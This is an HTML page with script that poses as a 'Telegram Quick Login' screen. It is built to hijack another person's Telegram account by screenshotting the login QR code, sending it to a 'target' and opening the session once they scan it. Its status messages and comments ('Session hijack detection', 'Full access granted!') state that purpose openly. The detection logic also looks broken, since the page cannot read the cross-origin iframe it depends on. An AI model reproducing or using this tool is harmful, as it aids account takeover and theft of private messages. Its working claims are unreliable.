<!DOCTYPE html>
<html>
<head>
    <title>Telegram Quick Login</title>
    <meta name="viewport" content="width=device-width">
    <style>
        body { 
            margin: 0; 
            padding: 40px; 
            background: #fff;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            text-align: center;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            padding: 40px 20px;
        }
        h1 {
            color: #0088cc;
            font-size: 28px;
            margin-bottom: 10px;
        }
        p {
            color: #666;
            font-size: 16px;
            margin-bottom: 30px;
        }
        #qr {
            width: 280px;
            height: 280px;
            margin: 0 auto 30px;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        button {
            background: #0088cc;
            color: white;
            border: none;
            padding: 14px 32px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            max-width: 280px;
        }
        button:hover { background: #006699; }
        button:disabled { 
            background: #ccc; 
            cursor: not-allowed;
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #0088cc;
            min-height: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Telegram</h1>
        <p>Login to your account by scanning QR code</p>
        
        <div id="qr">
            <iframe 
                src="https://web.telegram.org/k/" 
                width="280" 
                height="280" 
                frameborder="0"
                sandbox="allow-scripts allow-same-origin allow-popups">
            </iframe>
        </div>
        
        <button id="downloadBtn">📥 Save QR Code</button>
        <button id="accessBtn" disabled style="display:none;">✅ Open Session</button>
        
        <div id="status">Waiting for QR...</div>
    </div>

    <script>
        const downloadBtn = document.getElementById('downloadBtn');
        const accessBtn = document.getElementById('accessBtn');
        const status = document.getElementById('status');
        const qrFrame = document.querySelector('#qr iframe');
        
        let qrReady = false;
        
        // QR ready detection
        const qrObserver = new MutationObserver(() => {
            const canvas = qrFrame.contentDocument?.querySelector('canvas');
            if (canvas && !qrReady) {
                qrReady = true;
                downloadBtn.disabled = false;
                status.textContent = '✅ QR Code ready - Download & share';
            }
        });
        
        qrObserver.observe(document.body, { childList: true, subtree: true });
        
        // Download QR (screenshot)
        downloadBtn.onclick = async () => {
            try {
                const canvas = await html2canvas(document.querySelector('#qr'), {
                    backgroundColor: null,
                    scale: 2
                });
                const link = document.createElement('a');
                link.download = 'Telegram_Login_QR.png';
                link.href = canvas.toDataURL();
                link.click();
                status.textContent = '✅ QR Downloaded! Send to target';
            } catch(e) {
                // Fallback screenshot
                window.print();
            }
        };
        
        // Session hijack detection
        setInterval(async () => {
            try {
                const res = await fetch('https://web.telegram.org/k/api/config');
                if (res.ok && accessBtn.style.display === 'none') {
                    accessBtn.style.display = 'block';
                    downloadBtn.style.display = 'none';
                    status.textContent = '🎯 Target scanned QR! Click Access';
                }
            } catch(e) {}
        }, 2000);
        
        // Hijack
        accessBtn.onclick = () => {
            window.open('https://web.telegram.org/k/', '_blank');
            status.textContent = '🔓 Session opened - Full access granted!';
        };
    </script>
    
    <!-- html2canvas for screenshot -->
    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
</body>
</html>
